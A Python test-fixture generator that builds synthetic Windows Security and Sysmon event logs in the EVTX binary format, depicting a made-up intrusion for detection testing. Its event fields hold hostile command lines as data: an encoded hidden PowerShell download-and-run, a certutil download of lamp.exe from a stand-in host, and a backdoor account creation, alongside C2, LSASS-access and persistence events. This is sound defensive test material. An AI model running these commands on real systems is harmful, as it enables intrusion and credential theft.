#!/usr/bin/env python3
"""Writes the synthetic Windows event logs used by the tests:

    security-sample.evtx   a Security log (logons, a password spray, a new admin account, a cleared log)
    sysmon-sample.evtx     a Sysmon log (process tree, a download, C2 connection, LSASS access, persistence)

Everything in them is made up: hosts end in .example, IPs are documentation ranges
(192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) and the people do not exist.

The files follow the real format: a file header, 64 KB chunks with CRC32 checksums, and
records of binary XML built from templates with substitution values, as Windows writes them.

Run:  python3 tests/fixtures/make_evtx.py   (Python 3 standard library only)
"""
import struct, zlib, os, datetime

HERE = os.path.dirname(os.path.abspath(__file__))
EPOCH = datetime.datetime(1601, 1, 1, tzinfo=datetime.timezone.utc)


def filetime(iso):
    t = datetime.datetime.fromisoformat(iso.replace('Z', '+00:00'))
    return int((t - EPOCH).total_seconds() * 10_000_000)


class W:
    """A byte writer that knows its position inside the 64 KB chunk (names and templates are addressed that way)."""
    def __init__(self, base):
        self.b = bytearray(); self.base = base
    @property
    def pos(self): return self.base + len(self.b)
    def u8(self, v): self.b += struct.pack('<B', v)
    def u16(self, v): self.b += struct.pack('<H', v)
    def u32(self, v): self.b += struct.pack('<I', v)
    def raw(self, data): self.b += data
    def patch32(self, at, v): self.b[at:at + 4] = struct.pack('<I', v)
    def name(self, s):                                   # a name string stored inline: next, hash, length, UTF-16, null
        h = 0
        for ch in s: h = (h * 65599 + ord(ch)) & 0xFFFF
        self.u32(0); self.u16(h); self.u16(len(s)); self.raw(s.encode('utf-16le')); self.u16(0)


# substitution value types
T_NULL, T_WSTR, T_U8, T_U16, T_U32, T_U64, T_BOOL, T_GUID, T_FT, T_SID, T_HEX32, T_HEX64 = 0x00, 0x01, 0x04, 0x06, 0x08, 0x0a, 0x0d, 0x0f, 0x11, 0x13, 0x14, 0x15


def value_bytes(t, v):
    if t == T_NULL: return b''
    if t == T_WSTR: return str(v).encode('utf-16le')
    if t == T_U8: return struct.pack('<B', v)
    if t == T_U16: return struct.pack('<H', v)
    if t in (T_U32, T_HEX32, T_BOOL): return struct.pack('<I', v)
    if t in (T_U64, T_HEX64): return struct.pack('<Q', v)
    if t == T_FT: return struct.pack('<Q', filetime(v))
    if t == T_GUID:
        h = v.strip('{}').replace('-', ''); b = bytes.fromhex(h)
        return struct.pack('<IHH', int(h[0:8], 16), int(h[8:12], 16), int(h[12:16], 16)) + b[8:]
    if t == T_SID:
        parts = v.split('-'); rev, auth, subs = int(parts[1]), int(parts[2]), [int(x) for x in parts[3:]]
        return struct.pack('<BB', rev, len(subs)) + auth.to_bytes(6, 'big') + b''.join(struct.pack('<I', s) for s in subs)
    raise ValueError(t)


def element(w, name, attrs=(), content=None):
    """An element inside a template definition (these carry the 2-byte dependency id)."""
    w.u8(0x41 if attrs else 0x01); w.u16(0xFFFF)
    size_at = len(w.b); w.u32(0)
    w.u32(w.pos + 4); w.name(name)                       # the name follows straight away
    if attrs:
        al_at = len(w.b); w.u32(0); a0 = len(w.b)
        for an, av in attrs:
            w.u8(0x06); w.u32(w.pos + 4); w.name(an); av(w)
        w.patch32(al_at, len(w.b) - a0)
    if content is None:
        w.u8(0x03)
    else:
        w.u8(0x02); content(w); w.u8(0x04)
    w.patch32(size_at, len(w.b) - size_at - 4)


def text(s):
    def f(w): w.u8(0x05); w.u8(0x01); w.u16(len(s)); w.raw(s.encode('utf-16le'))
    return f


def sub(i, t, optional=True):
    def f(w): w.u8(0x0e if optional else 0x0d); w.u16(i); w.u8(t)
    return f


SYSTEM = [('Provider', T_WSTR), ('ProviderGuid', T_GUID), ('EventID', T_U16), ('Version', T_U8), ('Level', T_U8), ('Task', T_U16), ('Opcode', T_U8),
          ('Keywords', T_HEX64), ('SystemTime', T_FT), ('EventRecordID', T_U64), ('ProcessID', T_U32), ('ThreadID', T_U32), ('Channel', T_WSTR), ('Computer', T_WSTR), ('UserID', T_SID)]


def template_body(fields, userdata=None):
    """Event > System + EventData (Data Name=…) or UserData, with every value a substitution."""
    def body(w):
        w.raw(b'\x0f\x01\x01\x00')
        S = {n: i for i, (n, _) in enumerate(SYSTEM)}
        def system(w):
            element(w, 'Provider', [('Name', sub(S['Provider'], T_WSTR)), ('Guid', sub(S['ProviderGuid'], T_GUID))])
            for n in ('EventID', 'Version', 'Level', 'Task', 'Opcode', 'Keywords'):
                element(w, n, (), sub(S[n], dict(SYSTEM)[n]))
            element(w, 'TimeCreated', [('SystemTime', sub(S['SystemTime'], T_FT))])
            element(w, 'EventRecordID', (), sub(S['EventRecordID'], T_U64))
            element(w, 'Correlation')
            element(w, 'Execution', [('ProcessID', sub(S['ProcessID'], T_U32)), ('ThreadID', sub(S['ThreadID'], T_U32))])
            element(w, 'Channel', (), sub(S['Channel'], T_WSTR))
            element(w, 'Computer', (), sub(S['Computer'], T_WSTR))
            element(w, 'Security', [('UserID', sub(S['UserID'], T_SID))])
        def data(w):
            for k, (n, t) in enumerate(fields):
                element(w, 'Data', [('Name', text(n))], sub(len(SYSTEM) + k, t))
        def user(w):
            def inner(w):
                for k, (n, t) in enumerate(fields):
                    element(w, n, (), sub(len(SYSTEM) + k, t))
            element(w, userdata[0], [('xmlns', text(userdata[1]))], inner)
        def event(w):
            element(w, 'System', (), system)
            if userdata: element(w, 'UserData', (), user)
            else: element(w, 'EventData', (), data)
        element(w, 'Event', [('xmlns', text('http://schemas.microsoft.com/win/2004/08/events/event'))], event)
        w.u8(0x00)                                       # end of stream
    return body


class Log:
    def __init__(self):
        self.chunks = []; self.rec = 0; self._new_chunk()
    def _new_chunk(self):
        self.cur = {'buf': bytearray(65536), 'used': 512, 'tmpl': {}, 'first': self.rec + 1, 'last': self.rec, 'lastoff': 0}
        self.chunks.append(self.cur)

    def add(self, ev):
        for attempt in range(2):
            ch = self.cur; w = W(ch['used'] + 24)
            fields = ev['fields']; key = (tuple((n, t) for n, t, _ in fields), ev.get('userdata'))
            tid = (zlib.crc32(repr(key).encode()) & 0xFFFFFFFF) or 1
            w.raw(b'\x0f\x01\x01\x00'); w.u8(0x0c); w.u8(0x01); w.u32(tid)
            if key in ch['tmpl']:
                w.u32(ch['tmpl'][key])
            else:                                        # first use in this chunk: define the template right here
                off = w.pos + 4; w.u32(off); ch['tmpl'][key] = off
                w.u32(0); w.raw(struct.pack('<I', tid) + bytes(12)); dl_at = len(w.b); w.u32(0); b0 = len(w.b)
                template_body([(n, t) for n, t, _ in fields], ev.get('userdata'))(w)
                w.patch32(dl_at, len(w.b) - b0)
            vals = [(T_WSTR, ev['provider']), (T_GUID, ev.get('pguid', '{54849625-5478-4994-a5ba-3e3b0328c30d}')), (T_U16, ev['id']), (T_U8, ev.get('version', 0)), (T_U8, ev.get('level', 0)),
                    (T_U16, ev.get('task', 0)), (T_U8, 0), (T_HEX64, ev.get('keywords', 0x8020000000000000)), (T_FT, ev['time']), (T_U64, self.rec + 1), (T_U32, ev.get('pid', 648)),
                    (T_U32, ev.get('tid', 4132)), (T_WSTR, ev['channel']), (T_WSTR, ev['computer']), (T_SID, ev.get('sid', 'S-1-5-18'))] + [(t, v) for _, t, v in fields]
            enc = [value_bytes(t, v) for t, v in vals]
            w.u32(len(vals))
            for (t, _), e in zip(vals, enc): w.u16(len(e)); w.u8(t); w.u8(0)
            for e in enc: w.raw(e)
            binxml = bytes(w.b); size = 24 + len(binxml) + 4; size += (-size) % 8
            if ch['used'] + size > 65536 - 8:
                if attempt: raise RuntimeError('record too big for a chunk')
                self._new_chunk(); continue
            self.rec += 1
            r = struct.pack('<IIQQ', 0x00002a2a, size, self.rec, filetime(ev['time'])) + binxml
            r += bytes(size - 4 - len(r)) + struct.pack('<I', size)
            ch['buf'][ch['used']:ch['used'] + size] = r; ch['lastoff'] = ch['used']; ch['used'] += size; ch['last'] = self.rec
            return

    def save(self, path):
        out = bytearray(4096)
        for ch in self.chunks:
            b = ch['buf']; b[0:8] = b'ElfChnk\x00'
            struct.pack_into('<QQQQIII', b, 8, ch['first'], ch['last'], ch['first'], ch['last'], 128, ch['lastoff'], ch['used'])
            struct.pack_into('<I', b, 52, zlib.crc32(bytes(b[512:ch['used']])) & 0xFFFFFFFF)
            struct.pack_into('<I', b, 124, zlib.crc32(bytes(b[0:120]) + bytes(b[128:512])) & 0xFFFFFFFF)
            out += b
        out[0:8] = b'ElfFile\x00'
        struct.pack_into('<QQQIHHHH', out, 8, 0, len(self.chunks) - 1, self.rec + 1, 128, 1, 3, 4096, len(self.chunks))
        struct.pack_into('<I', out, 124, zlib.crc32(bytes(out[0:120])) & 0xFFFFFFFF)
        open(path, 'wb').write(out)


HOST, DC = 'WS-FIN-07.corp.example', 'DC01.corp.example'
SEC = dict(provider='Microsoft-Windows-Security-Auditing', channel='Security', computer=HOST)
S, U32, U16, HX, SID, GUID = T_WSTR, T_U32, T_U16, T_HEX64, T_SID, T_GUID


def security():
    L = Log()
    def logon(t, user, ltype, ip, lid, proc='C:\\Windows\\System32\\svchost.exe', ws='WS-FIN-07'):
        L.add(dict(SEC, id=4624, task=12544, time=t, fields=[('SubjectUserSid', SID, 'S-1-5-18'), ('SubjectUserName', S, 'WS-FIN-07$'), ('SubjectDomainName', S, 'CORP'), ('SubjectLogonId', HX, 0x3e7),
            ('TargetUserSid', SID, 'S-1-5-21-1111111111-2222222222-3333333333-1105'), ('TargetUserName', S, user), ('TargetDomainName', S, 'CORP'), ('TargetLogonId', HX, lid), ('LogonType', U32, ltype),
            ('LogonProcessName', S, 'User32' if ltype in (2, 10) else 'NtLmSsp'), ('AuthenticationPackageName', S, 'Negotiate' if ltype != 3 else 'NTLM'), ('WorkstationName', S, ws),
            ('LogonGuid', GUID, '{00000000-0000-0000-0000-000000000000}'), ('ProcessName', S, proc), ('IpAddress', S, ip), ('IpPort', S, '0' if ip == '-' else '49832')]))
    logon('2026-09-14T08:41:02.120Z', 'j.okafor', 2, '-', 0x51a2f)
    for k in range(12):
        L.add(dict(SEC, id=4625, task=12544, level=0, keywords=0x8010000000000000, time='2026-09-14T08:44:%02d.400Z' % (k * 4), fields=[('SubjectUserSid', SID, 'S-1-0-0'), ('SubjectUserName', S, '-'),
            ('SubjectDomainName', S, '-'), ('SubjectLogonId', HX, 0), ('TargetUserSid', SID, 'S-1-0-0'), ('TargetUserName', S, ['administrator', 'admin', 'svc_backup', 'j.okafor'][k % 4]),
            ('TargetDomainName', S, 'CORP'), ('Status', T_HEX32, 0xc000006d), ('FailureReason', S, '%%2313'), ('SubStatus', T_HEX32, 0xc000006a), ('LogonType', U32, 3),
            ('LogonProcessName', S, 'NtLmSsp'), ('AuthenticationPackageName', S, 'NTLM'), ('WorkstationName', S, 'KALI'), ('IpAddress', S, '203.0.113.47'), ('IpPort', S, str(51000 + k))]))
    logon('2026-09-14T08:46:10.900Z', 'svc_backup', 10, '203.0.113.47', 0x6b3c1, ws='KALI')
    L.add(dict(SEC, id=4672, task=12548, time='2026-09-14T08:46:10.910Z', fields=[('SubjectUserSid', SID, 'S-1-5-21-1111111111-2222222222-3333333333-1109'), ('SubjectUserName', S, 'svc_backup'),
        ('SubjectDomainName', S, 'CORP'), ('SubjectLogonId', HX, 0x6b3c1), ('PrivilegeList', S, 'SeBackupPrivilege\r\n\t\t\tSeRestorePrivilege\r\n\t\t\tSeDebugPrivilege')]))
    def proc(t, image, cmd, parent):
        L.add(dict(SEC, id=4688, version=2, task=13312, time=t, fields=[('SubjectUserSid', SID, 'S-1-5-21-1111111111-2222222222-3333333333-1109'), ('SubjectUserName', S, 'svc_backup'),
            ('SubjectDomainName', S, 'CORP'), ('SubjectLogonId', HX, 0x6b3c1), ('NewProcessId', HX, 0x1a2c), ('NewProcessName', S, image), ('TokenElevationType', S, '%%1937'),
            ('ProcessId', HX, 0x13f4), ('CommandLine', S, cmd), ('TargetUserSid', SID, 'S-1-0-0'), ('TargetUserName', S, '-'), ('TargetDomainName', S, '-'), ('TargetLogonId', HX, 0),
            ('ParentProcessName', S, parent), ('MandatoryLabel', SID, 'S-1-16-12288')]))
    proc('2026-09-14T08:47:30.000Z', 'C:\\Windows\\System32\\cmd.exe', 'cmd.exe /c whoami /all', 'C:\\Windows\\explorer.exe')
    proc('2026-09-14T08:47:41.000Z', 'C:\\Windows\\System32\\net.exe', 'net user helpdesk2 Passw0rd! /add', 'C:\\Windows\\System32\\cmd.exe')
    L.add(dict(SEC, id=4720, task=13824, time='2026-09-14T08:47:41.200Z', fields=[('TargetUserName', S, 'helpdesk2'), ('TargetDomainName', S, 'WS-FIN-07'),
        ('TargetSid', SID, 'S-1-5-21-1234567890-2345678901-3456789012-1001'), ('SubjectUserSid', SID, 'S-1-5-21-1111111111-2222222222-3333333333-1109'), ('SubjectUserName', S, 'svc_backup'),
        ('SubjectDomainName', S, 'CORP'), ('SubjectLogonId', HX, 0x6b3c1), ('SamAccountName', S, 'helpdesk2'), ('DisplayName', S, '%%1793'), ('UserPrincipalName', S, '-'),
        ('UserAccountControl', S, '\r\n\t\t%%2080\r\n\t\t%%2082\r\n\t\t%%2084')]))
    L.add(dict(SEC, id=4732, task=13826, time='2026-09-14T08:47:52.000Z', fields=[('MemberName', S, '-'), ('MemberSid', SID, 'S-1-5-21-1234567890-2345678901-3456789012-1001'),
        ('TargetUserName', S, 'Administrators'), ('TargetDomainName', S, 'Builtin'), ('TargetSid', SID, 'S-1-5-32-544'), ('SubjectUserSid', SID, 'S-1-5-21-1111111111-2222222222-3333333333-1109'),
        ('SubjectUserName', S, 'svc_backup'), ('SubjectDomainName', S, 'CORP'), ('SubjectLogonId', HX, 0x6b3c1), ('PrivilegeList', S, '-')]))
    L.add(dict(SEC, id=4698, task=12804, time='2026-09-14T08:48:05.000Z', fields=[('SubjectUserSid', SID, 'S-1-5-21-1111111111-2222222222-3333333333-1109'), ('SubjectUserName', S, 'svc_backup'),
        ('SubjectDomainName', S, 'CORP'), ('SubjectLogonId', HX, 0x6b3c1), ('TaskName', S, '\\UpdaterTask'),
        ('TaskContent', S, '<Task><Actions><Exec><Command>C:\\Users\\Public\\lamp.exe</Command></Exec></Actions></Task>')]))
    for k in range(300):                                 # ordinary background noise, enough to fill a second chunk
        logon('2026-09-14T09:%02d:%02d.000Z' % (k // 12, (k % 12) * 5), 'WS-FIN-07$', 3, '10.20.30.%d' % (10 + k % 5), 0x70000 + k, proc='-', ws='-')
    L.add(dict(provider='Microsoft-Windows-Eventlog', pguid='{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}', channel='Security', computer=HOST, id=1102, level=4, task=104, keywords=0x4020000000000000,
        time='2026-09-14T09:31:00.000Z', userdata=('LogFileCleared', 'http://manifests.microsoft.com/win/2004/08/windows/eventlog'),
        fields=[('SubjectUserSid', SID, 'S-1-5-21-1111111111-2222222222-3333333333-1109'), ('SubjectUserName', S, 'svc_backup'), ('SubjectDomainName', S, 'CORP'), ('SubjectLogonId', HX, 0x6b3c1)]))
    return L


SYS = dict(provider='Microsoft-Windows-Sysmon', pguid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', channel='Microsoft-Windows-Sysmon/Operational', computer=HOST, version=5, level=4, keywords=0x8000000000000000, sid='S-1-5-18')


def sysmon():
    L = Log()
    g = lambda n: '{8f2b5c1a-0000-4000-8000-%012x}' % n
    def p1(t, pid, image, cmd, parent, ppid, user='CORP\\j.okafor', hashes='SHA256=8F16A431C919A0AA7C9F0E1B2C3D4E5F60718293A4B5C6D7E8F90A1B2C3D4E5F'):
        L.add(dict(SYS, id=1, task=1, time=t, fields=[('RuleName', S, '-'), ('UtcTime', S, t.replace('T', ' ')[:23]), ('ProcessGuid', GUID, g(pid)), ('ProcessId', U32, pid), ('Image', S, image),
            ('FileVersion', S, '-'), ('Description', S, '-'), ('Product', S, '-'), ('Company', S, '-'), ('OriginalFileName', S, image.split('\\')[-1].upper()), ('CommandLine', S, cmd),
            ('CurrentDirectory', S, 'C:\\Users\\j.okafor\\Downloads\\'), ('User', S, user), ('LogonGuid', GUID, g(0xffff)), ('LogonId', HX, 0x51a2f), ('TerminalSessionId', U32, 1),
            ('IntegrityLevel', S, 'Medium'), ('Hashes', S, hashes), ('ParentProcessGuid', GUID, g(ppid)), ('ParentProcessId', U32, ppid), ('ParentImage', S, parent),
            ('ParentCommandLine', S, parent.split('\\')[-1]), ('ParentUser', S, user)]))
    p1('2026-09-14T08:57:33.100Z', 4120, 'C:\\Windows\\System32\\cmd.exe', 'cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA',
       'C:\\Windows\\explorer.exe', 3312)
    p1('2026-09-14T08:57:33.400Z', 4188, 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA',
       'C:\\Windows\\System32\\cmd.exe', 4120)
    p1('2026-09-14T08:57:40.000Z', 4212, 'C:\\Windows\\System32\\certutil.exe', 'certutil.exe -urlcache -split -f http://update-lamp.test/lamp.exe C:\\Users\\Public\\lamp.exe',
       'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 4188)
    L.add(dict(SYS, id=22, task=22, time='2026-09-14T08:57:40.200Z', fields=[('RuleName', S, '-'), ('UtcTime', S, '2026-09-14 08:57:40.200'), ('ProcessGuid', GUID, g(4212)), ('ProcessId', U32, 4212),
        ('QueryName', S, 'update-lamp.test'), ('QueryStatus', S, '0'), ('QueryResults', S, '::ffff:203.0.113.47;'), ('Image', S, 'C:\\Windows\\System32\\certutil.exe'), ('User', S, 'CORP\\j.okafor')]))
    L.add(dict(SYS, id=11, task=11, time='2026-09-14T08:57:41.000Z', fields=[('RuleName', S, '-'), ('UtcTime', S, '2026-09-14 08:57:41.000'), ('ProcessGuid', GUID, g(4212)), ('ProcessId', U32, 4212),
        ('Image', S, 'C:\\Windows\\System32\\certutil.exe'), ('TargetFilename', S, 'C:\\Users\\Public\\lamp.exe'), ('CreationUtcTime', S, '2026-09-14 08:57:41.000'), ('User', S, 'CORP\\j.okafor')]))
    p1('2026-09-14T08:58:02.000Z', 4300, 'C:\\Users\\Public\\lamp.exe', 'C:\\Users\\Public\\lamp.exe', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 4188,
       hashes='SHA256=9F2C1D0B7E4A6C8F3B5D2E1A0C9B8A7F6E5D4C3B2A190817263544332211FFEE')
    for k in range(8):
        L.add(dict(SYS, id=3, task=3, time='2026-09-14T09:%02d:05.000Z' % k, fields=[('RuleName', S, '-'), ('UtcTime', S, '2026-09-14 09:%02d:05.000' % k), ('ProcessGuid', GUID, g(4300)),
            ('ProcessId', U32, 4300), ('Image', S, 'C:\\Users\\Public\\lamp.exe'), ('User', S, 'CORP\\j.okafor'), ('Protocol', S, 'tcp'), ('Initiated', T_BOOL, 1), ('SourceIsIpv6', T_BOOL, 0),
            ('SourceIp', S, '10.20.30.17'), ('SourceHostname', S, '-'), ('SourcePort', U16, 51200 + k), ('SourcePortName', S, '-'), ('DestinationIsIpv6', T_BOOL, 0),
            ('DestinationIp', S, '203.0.113.47'), ('DestinationHostname', S, '-'), ('DestinationPort', U16, 4444), ('DestinationPortName', S, '-')]))
    def p10(t, src, spid, access):
        L.add(dict(SYS, id=10, task=10, time=t, fields=[('RuleName', S, '-'), ('UtcTime', S, t.replace('T', ' ')[:23]), ('SourceProcessGUID', GUID, g(spid)), ('SourceProcessId', U32, spid),
            ('SourceThreadId', U32, 5120), ('SourceImage', S, src), ('TargetProcessGUID', GUID, g(712)), ('TargetProcessId', U32, 712), ('TargetImage', S, 'C:\\Windows\\system32\\lsass.exe'),
            ('GrantedAccess', T_HEX32, access), ('CallTrace', S, 'C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|UNKNOWN(0000000000A1B2C3)'), ('SourceUser', S, 'NT AUTHORITY\\SYSTEM'), ('TargetUser', S, 'NT AUTHORITY\\SYSTEM')]))
    for k in range(5): p10('2026-09-14T08:%02d:00.000Z' % (30 + k), 'C:\\Windows\\system32\\svchost.exe', 1200, 0x1000)                          # ordinary: Windows reads LSASS
    p10('2026-09-14T08:40:00.000Z', 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2207.7-0\\MsMpEng.exe', 3020, 0x1410)            # ordinary: antivirus
    p10('2026-09-14T09:12:44.000Z', 'C:\\Users\\Public\\lamp.exe', 4300, 0x1010)                                                              # credential dumping
    L.add(dict(SYS, id=13, task=13, time='2026-09-14T09:13:10.000Z', fields=[('RuleName', S, '-'), ('EventType', S, 'SetValue'), ('UtcTime', S, '2026-09-14 09:13:10.000'), ('ProcessGuid', GUID, g(4300)),
        ('ProcessId', U32, 4300), ('Image', S, 'C:\\Users\\Public\\lamp.exe'), ('TargetObject', S, 'HKU\\S-1-5-21-1111111111-2222222222-3333333333-1105\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater'),
        ('Details', S, 'C:\\Users\\Public\\lamp.exe'), ('User', S, 'CORP\\j.okafor')]))
    return L


if __name__ == '__main__':
    for name, build in (('security-sample.evtx', security), ('sysmon-sample.evtx', sysmon)):
        L = build(); L.save(os.path.join(HERE, name)); print(name, L.rec, 'events,', len(L.chunks), 'chunk(s)')
